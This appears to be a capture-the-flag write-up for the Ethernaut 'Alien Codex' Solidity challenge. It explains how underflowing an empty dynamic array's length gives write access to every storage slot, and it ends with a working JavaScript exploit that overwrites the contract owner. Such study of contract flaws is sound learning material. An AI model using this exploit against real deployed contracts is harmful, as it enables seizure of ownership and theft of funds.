# Ethernaut Challenge #19: Alien Codex

**Objective:** Claim ownership of the contract.

**Contract Analysis:**
```solidity
contract AlienCodex is Ownable {
  bool public contact;
  bytes32[] public codex;

  modifier contacted() {
    assert(contact);
    _;
  }

  function makeContact() public {
    contact = true;
  }

  function record(bytes32 _content) contacted public {
    codex.push(_content);
  }

  function retract() contacted public {
    codex.length--;
  }

  function revise(uint i, bytes32 _content) contacted public {
    codex[i] = _content;
  }
}
```

**The Vulnerability:**

Line 18: `codex.length--` — underflow!

**Dynamic Array Storage:**

- Slot 0: `contact` (bool) + Ownable data
- Slot 1: `codex.length` (uint256)
- Slot keccak256(1): `codex[0]`
- Slot keccak256(1)+1: `codex[1]`
- ...and so on

**The Attack:**

1. `makeContact()` — set contact = true
2. `retract()` — decrement empty array length
   - `codex.length` = 0
   - After decrement: `codex.length` = 2^256 - 1 (underflow!)
3. Now codex spans ALL storage slots!
4. Calculate which index writes to slot 0 (owner)

**Calculating the Index:**

```
codex[i] slot = keccak256(1) + i

We want: keccak256(1) + i = 0 (mod 2^256)
So: i = -keccak256(1) (mod 2^256)
i = 2^256 - keccak256(1)
```

**The Exploit:**
```javascript
// 1. Make contact
await contract.makeContact();

// 2. Underflow the array
await contract.retract();

// 3. Calculate index that maps to slot 0
const codexStart = BigInt(web3.utils.keccak256(web3.eth.abi.encodeParameter('uint256', 1)));
const index = BigInt(2) ** BigInt(256) - codexStart;

// 4. Overwrite owner (slot 0) with player address
await contract.revise(index.toString(), playerAddress);
```

**The Lesson:**

Array length underflow = infinite array = write to any storage slot.

Storage is just a flat 2^256 slot space. Dynamic arrays map to ranges within that.

**Status:** Challenge understood. Array underflow + storage mapping.
